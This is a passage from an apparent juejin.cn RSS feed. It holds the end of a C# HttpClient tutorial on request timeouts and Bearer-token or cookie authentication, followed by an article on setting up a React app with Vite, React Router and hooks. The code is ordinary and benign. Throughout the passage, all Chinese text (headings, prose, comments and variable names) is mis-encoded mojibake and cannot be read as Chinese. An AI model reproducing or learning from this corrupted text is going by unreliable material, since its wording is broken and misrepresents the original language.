        <span class="hljs-keyword">var</span> å–æ¶ˆä»¤ç‰Œæº = <span class="hljs-keyword">new</span> CancellationTokenSource();
        
        <span class="hljs-comment">// å¦‚æœ5ç§’è¿˜æ²¡å“åº”ï¼Œå°±å–æ¶ˆ</span>
        å–æ¶ˆä»¤ç‰Œæº.CancelAfter(TimeSpan.FromSeconds(<span class="hljs-number">5</span>));
        
        <span class="hljs-keyword">var</span> å“åº” = <span class="hljs-keyword">await</span> æˆ‘çš„APP.GetAsync(<span class="hljs-string">"menu"</span>, å–æ¶ˆä»¤ç‰Œæº.Token);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> å“åº”.Content.ReadAsStringAsync();
    }
    <span class="hljs-keyword">catch</span> (TaskCanceledException)
    {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"è¯·æ±‚è¶…æ—¶ï¼Œè¯·ç¨åé‡è¯•"</span>;
    }
    <span class="hljs-keyword">catch</span> (HttpRequestException)
    {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ç½‘ç»œè¿æ¥å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œ"</span>;
    }
}
</code></pre>
<h3 data-id="heading-15">é—®é¢˜2ï¼šéœ€è¦æ·»åŠ è®¤è¯ä¿¡æ¯ï¼Ÿ</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> è®¾ç½®ç™»å½•çŠ¶æ€(<span class="hljs-built_in">string</span> ä»¤ç‰Œ)
{
    <span class="hljs-comment">// æ–¹æ³•1ï¼šæ·»åŠ åˆ°é»˜è®¤è¯·æ±‚å¤´</span>
    æˆ‘çš„APP.DefaultRequestHeaders.Authorization = 
        <span class="hljs-keyword">new</span> AuthenticationHeaderValue(<span class="hljs-string">"Bearer"</span>, ä»¤ç‰Œ);
    
    <span class="hljs-comment">// æ–¹æ³•2ï¼šæ¯æ¬¡è¯·æ±‚å•ç‹¬æ·»åŠ </span>
    <span class="hljs-keyword">var</span> è¯·æ±‚ = <span class="hljs-keyword">new</span> HttpRequestMessage(HttpMethod.Get, <span class="hljs-string">"user/profile"</span>);
    è¯·æ±‚.Headers.Authorization = <span class="hljs-keyword">new</span> AuthenticationHeaderValue(<span class="hljs-string">"Bearer"</span>, ä»¤ç‰Œ);
    
    <span class="hljs-comment">// æ–¹æ³•3ï¼šä½¿ç”¨HttpClientHandler</span>
    <span class="hljs-keyword">var</span> handler = <span class="hljs-keyword">new</span> HttpClientHandler
    {
        UseCookies = <span class="hljs-literal">true</span>,
        CookieContainer = <span class="hljs-keyword">new</span> CookieContainer()
    };
    handler.CookieContainer.Add(<span class="hljs-keyword">new</span> Uri(<span class="hljs-string">"https://api.food.com"</span>), 
                               <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">"session"</span>, ä»¤ç‰Œ));
}
</code></pre>
<h2 data-id="heading-16">æ€»ç»“æ¯”å–»</h2>
<p><strong>HttpClient = ä½ çš„æ™ºèƒ½æ‰‹æœºå¤–å–APP</strong></p>
<ol>
<li><strong>ä¸€æ¬¡å®‰è£…ï¼Œé•¿æœŸä½¿ç”¨</strong>Â - ä¸ç”¨æ¯æ¬¡ç‚¹é¤éƒ½é‡æ–°ä¸‹è½½APP</li>
<li><strong>ä¿æŒç™»å½•çŠ¶æ€</strong>Â - ç™»å½•ä¸€æ¬¡ï¼Œåç»­æ“ä½œéƒ½ä¸ç”¨å†ç™»å½•</li>
<li><strong>å¹¶è¡Œæ“ä½œ</strong>Â - å¯ä»¥åŒæ—¶æµè§ˆé¤å…ã€æŸ¥çœ‹è®¢å•ã€è”ç³»å®¢æœ</li>
<li><strong>å¤„ç†å„ç§æ•°æ®</strong>Â - èƒ½å‘æ–‡å­—ã€å›¾ç‰‡ã€æ–‡ä»¶ï¼Œå°±åƒAPPèƒ½å‘æ¶ˆæ¯ã€ä¼ ç…§ç‰‡</li>
<li><strong>æ™ºèƒ½é‡è¯•</strong>Â - ç½‘ç»œä¸å¥½æ—¶ä¼šè‡ªåŠ¨é‡è¯•ï¼Œå°±åƒAPPçš„"é‡æ–°åŠ è½½"</li>
<li><strong>ç»Ÿä¸€ç®¡ç†</strong>Â - æ‰€æœ‰å¤–å–æ“ä½œéƒ½åœ¨ä¸€ä¸ªAPPé‡Œå®Œæˆ</li>
</ol>
<p><strong>æ ¸å¿ƒæ€æƒ³è½¬å˜ï¼š</strong><br/>
ä»ã€Œæ¯æ¬¡éƒ½è¦é‡æ–°æ‰“ç”µè¯è”ç³»é¤å…ã€<br/>
å˜æˆã€Œæœ‰ä¸€ä¸ªæ™ºèƒ½å¤–å–APPï¼Œæ‰€æœ‰é¤å…ã€æ‰€æœ‰æ“ä½œéƒ½åœ¨é‡Œé¢å®Œæˆã€</p>
<p>HttpClientè®©ä½ çš„ç¨‹åºèƒ½åƒä½¿ç”¨å¤–å–APPä¸€æ ·ï¼Œé«˜æ•ˆã€ç¨³å®šåœ°ä¸å„ç§ç½‘ç»œæœåŠ¡é€šä¿¡ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºç°ä»£ React åº”ç”¨ï¼šä»é¡¹ç›®åˆå§‹åŒ–åˆ°è·¯ç”±ä¸æ•°æ®è·å–]]></title>    <link>https://juejin.cn/post/7589903499599675446</link>    <guid>https://juejin.cn/post/7589903499599675446</guid>    <pubDate>2026-01-01T13:24:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599675446" data-draft-id="7589475497001107471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºç°ä»£ React åº”ç”¨ï¼šä»é¡¹ç›®åˆå§‹åŒ–åˆ°è·¯ç”±ä¸æ•°æ®è·å–"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-01T13:24:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Zyx2007"/> <meta itemprop="url" content="https://juejin.cn/user/3924597867554890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºç°ä»£ React åº”ç”¨ï¼šä»é¡¹ç›®åˆå§‹åŒ–åˆ°è·¯ç”±ä¸æ•°æ®è·å–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3924597867554890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Zyx2007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T13:24:14.000Z" title="Thu Jan 01 2026 13:24:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å½“ä»Šå‰ç«¯ç”Ÿæ€ä¸­ï¼ŒReact å‡­å€Ÿå…¶å£°æ˜å¼ç¼–ç¨‹æ¨¡å‹ã€ç»„ä»¶åŒ–æ¶æ„å’Œå¼ºå¤§çš„ç¤¾åŒºæ”¯æŒï¼Œæˆä¸ºæ„å»ºç”¨æˆ·ç•Œé¢çš„äº‹å®æ ‡å‡†ã€‚ç„¶è€Œï¼Œä¸€ä¸ªçœŸæ­£å¥å£®çš„ React åº”ç”¨ä¸ä»…ä¾èµ–äºæ ¸å¿ƒåº“æœ¬èº«ï¼Œæ›´éœ€è¦ä¸€å¥—å®Œæ•´çš„å·¥ç¨‹åŒ–ä½“ç³»â€”â€”ä»é¡¹ç›®è„šæ‰‹æ¶ã€æ¨¡å—ç®¡ç†ï¼Œåˆ°è·¯ç”±æ§åˆ¶ä¸å‰¯ä½œç”¨å¤„ç†ã€‚å€ŸåŠ© Vite è¿™ä¸€ç°ä»£åŒ–æ„å»ºå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿæ­å»ºé«˜æ€§èƒ½å¼€å‘ç¯å¢ƒï¼Œå¹¶é€šè¿‡ React Router å’Œ Hooks å®ç°ç»“æ„æ¸…æ™°ã€é€»è¾‘å†…èšçš„åº”ç”¨ç¨‹åºã€‚</p>
<h2 data-id="heading-0">é¡¹ç›®åˆå§‹åŒ–ï¼šVite é©±åŠ¨çš„æé€Ÿå¼€å‘ä½“éªŒ</h2>
<p>ç°ä»£å‰ç«¯é¡¹ç›®çš„èµ·ç‚¹ä¸å†æ˜¯æ‰‹åŠ¨é…ç½® Webpack æˆ– Babelï¼Œè€Œæ˜¯ä½¿ç”¨ <code>npm create vite</code> å‘½ä»¤ä¸€é”®ç”Ÿæˆæ ‡å‡†åŒ–æ¨¡æ¿ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">npm create vite my-react-app -- --<span class="hljs-keyword">template</span> react
cd my-react-app
npm install
npm run dev
</code></pre>
<p>Vite åˆ©ç”¨æµè§ˆå™¨åŸç”Ÿ ES æ¨¡å—ï¼ˆESMï¼‰èƒ½åŠ›ï¼Œåœ¨å¼€å‘é˜¶æ®µ<strong>æŒ‰éœ€åŠ è½½æ¨¡å—</strong>ï¼Œå®ç°æ¯«ç§’çº§å†·å¯åŠ¨ä¸å³æ—¶çƒ­æ›´æ–°ã€‚é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>index.html</code> ä½œä¸ºå…¥å£æ–‡ä»¶ï¼ŒåŒ…å«ä¸€ä¸ª <code>&lt;div id="root"&gt;&lt;/div&gt;</code> å®¹å™¨ï¼Œç”¨äºæŒ‚è½½ React åº”ç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.jsx</span>
<span class="hljs-keyword">import</span> { createRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App'</span>
<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>)).<span class="hljs-title function_">render</span>(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>)
</code></pre>
<p>è¿™ç§è®¾è®¡å°†æ„å»ºå·¥å…·ä¸ä¸šåŠ¡ä»£ç è§£è€¦ï¼Œå¼€å‘è€…åªéœ€å…³æ³¨ç»„ä»¶é€»è¾‘ï¼Œè€Œ Vite è´Ÿè´£å¤„ç†æ¨¡å—è§£æã€CSS é¢„å¤„ç†å™¨ï¼ˆå¦‚ Stylusï¼‰ã€TypeScript ç¼–è¯‘ç­‰åº•å±‚ç»†èŠ‚ã€‚ä¾èµ–è¢«æ˜ç¡®åˆ’åˆ†ä¸º <code>dependencies</code>ï¼ˆè¿è¡Œæ—¶ä¾èµ–ï¼Œå¦‚ <code>react</code>ã€<code>react-router-dom</code>ï¼‰å’Œ <code>devDependencies</code>ï¼ˆå¼€å‘å·¥å…·ï¼Œå¦‚ <code>vite</code>ã€<code>stylus</code>ï¼‰ï¼Œç¡®ä¿ç”Ÿäº§ç¯å¢ƒç²¾ç®€é«˜æ•ˆã€‚</p>
<h2 data-id="heading-1">ç»„ä»¶åŒ–æ¶æ„ï¼šå‡½æ•°å³ UI å•å…ƒ</h2>
<p>React çš„æ ¸å¿ƒæ€æƒ³æ˜¯â€œä¸€åˆ‡çš†ç»„ä»¶â€ã€‚æ¯ä¸ªé¡µé¢æˆ–åŠŸèƒ½æ¨¡å—éƒ½è¢«å°è£…ä¸ºä¸€ä¸ªå‡½æ•°ç»„ä»¶ï¼Œæ¥æ”¶ props å¹¶è¿”å› JSX æè¿°çš„ UI ç»“æ„ã€‚ä¾‹å¦‚ï¼Œé¦–é¡µç»„ä»¶ <code>Home</code> è´Ÿè´£å±•ç¤º GitHub ä»“åº“åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Home</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [repos, setRepos] = <span class="hljs-title function_">useState</span>([]);
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.github.com/users/username/repos'</span>)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">json</span> =&gt;</span> <span class="hljs-title function_">setRepos</span>(json));
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {repos.length ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
          {repos.map(repo =&gt; (
            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{repo.id}</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">{repo.html_url}</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"noreferrer"</span>&gt;</span>
                {repo.name}
              <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          ))}
        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      ) : <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æš‚æ— ä»“åº“<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>è¿™é‡Œï¼Œ<code>useState</code> ç®¡ç†å“åº”å¼çŠ¶æ€ <code>repos</code>ï¼Œè€Œ <code>useEffect</code> å¤„ç†å‰¯ä½œç”¨ï¼ˆå¦‚ API è¯·æ±‚ï¼‰ã€‚ç©ºä¾èµ–æ•°ç»„ <code>[]</code> ç¡®ä¿è¯·æ±‚ä»…åœ¨ç»„ä»¶<strong>é¦–æ¬¡æŒ‚è½½åæ‰§è¡Œä¸€æ¬¡</strong>ï¼Œé¿å…é‡å¤è°ƒç”¨ã€‚è¿™ç§â€œçŠ¶æ€ + å‰¯ä½œç”¨â€çš„ç»„åˆï¼Œæ„æˆäº† React å‡½æ•°ç»„ä»¶çš„æ ¸å¿ƒé€»è¾‘å•å…ƒã€‚</p>
<h2 data-id="heading-2">è·¯ç”±ç³»ç»Ÿï¼šå¤šé¡µé¢å¯¼èˆªçš„åŸºçŸ³</h2>
<p>å•é¡µåº”ç”¨ï¼ˆSPAï¼‰éœ€è¦åœ¨ä¸åˆ·æ–°é¡µé¢çš„å‰æä¸‹åˆ‡æ¢è§†å›¾ï¼Œè¿™æ­£æ˜¯ <strong>React Router</strong> çš„èŒè´£æ‰€åœ¨ã€‚é€šè¿‡å®‰è£… <code>react-router-dom</code>ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰è·¯å¾„ä¸ç»„ä»¶çš„æ˜ å°„å…³ç³»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/index.jsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../pages/Home'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../pages/About'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AppRoutes</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/about"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">About</span> /&gt;</span>} /&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span>
  );
}
</code></pre>
<p><code>&lt;Routes&gt;</code> ä½œä¸ºè·¯ç”±æ€»ç®¡ï¼Œæ ¹æ®å½“å‰ URL åŒ¹é…å¯¹åº”çš„ <code>&lt;Route&gt;</code>ï¼Œå¹¶æ¸²æŸ“å…¶ <code>element</code> å±æ€§æŒ‡å®šçš„ç»„ä»¶ã€‚è¿™ç§å£°æ˜å¼è·¯ç”±é…ç½®æ¸…æ™°ç›´è§‚ï¼Œæ˜“äºç»´æŠ¤ã€‚</p>
<h2 data-id="heading-3">å¯¼èˆªä¸å¸ƒå±€ï¼šLink ä¸ Router ä¸Šä¸‹æ–‡</h2>
<p>é¡µé¢é—´çš„è·³è½¬ä¸åº”ä½¿ç”¨åŸç”Ÿ <code>&lt;a&gt;</code> æ ‡ç­¾ï¼ˆä¼šè§¦å‘æ•´é¡µåˆ·æ–°ï¼‰ï¼Œè€Œåº”ä½¿ç”¨ React Router æä¾›çš„ <code>&lt;Link&gt;</code> ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Router</span>, <span class="hljs-title class_">Link</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AppRoutes</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>About<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">AppRoutes</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span>
  );
}
</code></pre>
<p><code>&lt;BrowserRouter&gt;</code>ï¼ˆç®€ç§° <code>Router</code>ï¼‰ä¸ºæ•´ä¸ªåº”ç”¨æä¾›è·¯ç”±ä¸Šä¸‹æ–‡ï¼Œä½¿ <code>&lt;Link&gt;</code> å’Œ <code>&lt;Routes&gt;</code> èƒ½å¤ŸååŒå·¥ä½œã€‚ç‚¹å‡»é“¾æ¥æ—¶ï¼ŒURL æ›´æ–°ï¼Œ<code>&lt;Routes&gt;</code> é‡æ–°åŒ¹é…å¹¶æ¸²æŸ“æ–°ç»„ä»¶ï¼Œå…¨ç¨‹æ— é¡µé¢è·³è½¬ï¼Œç”¨æˆ·ä½“éªŒæµç•…ã€‚</p>
<h2 data-id="heading-4">å·¥ç¨‹åŒ–æ€ç»´ï¼šä»å¼€å‘åˆ°ä¸Šçº¿çš„é—­ç¯</h2>
<p>ä¸€ä¸ªå®Œæ•´çš„ React é¡¹ç›®éµå¾ª <code>dev â†’ test â†’ production</code> çš„ç”Ÿå‘½å‘¨æœŸï¼š</p>
<ul>
<li><strong>å¼€å‘é˜¶æ®µ</strong>ï¼š<code>npm run dev</code> å¯åŠ¨ Vite å¼€å‘æœåŠ¡å™¨ï¼Œæ”¯æŒçƒ­æ›´æ–°ï¼›</li>
<li><strong>æµ‹è¯•é˜¶æ®µ</strong>ï¼šå¯é›†æˆ Jestã€React Testing Library ç­‰å·¥å…·éªŒè¯ç»„ä»¶è¡Œä¸ºï¼›</li>
<li><strong>ç”Ÿäº§é˜¶æ®µ</strong>ï¼š<code>npm run build</code> ç”Ÿæˆä¼˜åŒ–åçš„é™æ€èµ„æºï¼Œéƒ¨ç½²è‡³ CDN æˆ–æœåŠ¡å™¨ã€‚</li>
</ul>
<p>Vite åœ¨æ­¤è¿‡ç¨‹ä¸­æ‰®æ¼”â€œåŸºå»ºâ€è§’è‰²ï¼šå®ƒåŸºäº Node.jsï¼Œåˆ©ç”¨åŸç”Ÿ ESM æå‡å¼€å‘æ•ˆç‡ï¼ŒåŒæ—¶é€šè¿‡ Rollup æ‰“åŒ…ç”Ÿäº§ä»£ç ï¼Œå®ç°ä»£ç åˆ†å‰²ã€Tree Shaking ç­‰ä¼˜åŒ–ã€‚è€Œ React æœ¬èº«åˆ™èšç„¦äº UI æ¸²æŸ“â€”â€”<code>react</code> åŒ…å«æ ¸å¿ƒé€»è¾‘ï¼ˆå¦‚ Hooksã€ç»„ä»¶æ¨¡å‹ï¼‰ï¼Œ<code>react-dom</code> è´Ÿè´£å°†è™šæ‹Ÿ DOM æ˜ å°„åˆ°çœŸå®æµè§ˆå™¨èŠ‚ç‚¹ï¼ŒäºŒè€…åˆ†å·¥æ˜ç¡®ï¼Œå…±åŒæ„æˆç°ä»£å‰ç«¯åº”ç”¨çš„è¿è¡ŒåŸºç¡€ã€‚</p>
<h2 data-id="heading-5">æ€»ç»“</h2>
